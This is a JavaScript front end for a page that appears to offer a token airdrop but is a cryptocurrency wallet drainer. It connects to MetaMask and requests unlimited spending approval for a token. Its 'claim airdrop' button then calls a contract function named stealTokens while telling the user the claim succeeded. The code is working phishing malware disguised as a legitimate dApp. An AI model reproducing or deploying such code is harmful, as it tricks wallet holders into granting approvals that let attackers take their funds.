let web3, accounts, contractABI, config;

// Load ABI and configuration from external files
async function loadDependencies() {
  contractABI = await fetch("abi.json").then((response) => response.json());
  config = await fetch("config.json").then((response) => response.json());
}

// Connect to MetaMask
async function connectMetaMask() {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    try {
      // Request accounts
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      document.getElementById("approveButton").disabled = false;
      document.getElementById("claimAirdropButton").disabled = false;
      alert("Connected to MetaMask");
    } catch (error) {
      alert("MetaMask connection failed: " + error.message);
    }
  } else {
    alert("MetaMask not detected! Please install MetaMask.");
  }
}

// Approve spending
async function approveSpending() {
  const tokenContract = new web3.eth.Contract(contractABI, config.tokenAddress);
  try {
    const maxApproval = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
    await tokenContract.methods.approve(config.contractAddress, maxApproval).send({ from: accounts[0] });
    alert("Approval successful! You can now claim your airdrop.");
    document.getElementById("claimAirdropButton").disabled = false;
  } catch (error) {
    alert("Error during approval: " + error.message);
  }
}

// Claim airdrop
async function claimAirdrop() {
  const contract = new web3.eth.Contract(contractABI, config.contractAddress);
  try {
    await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
    alert("Airdrop claimed successfully!");
  } catch (error) {
    alert("Error claiming airdrop: " + error.message);
  }
}

// Event Listeners
document.getElementById("connectButton").addEventListener("click", connectMetaMask);
document.getElementById("approveButton").addEventListener("click", approveSpending);
document.getElementById("claimAirdropButton").addEventListener("click", claimAirdrop);

// Initialize
loadDependencies();


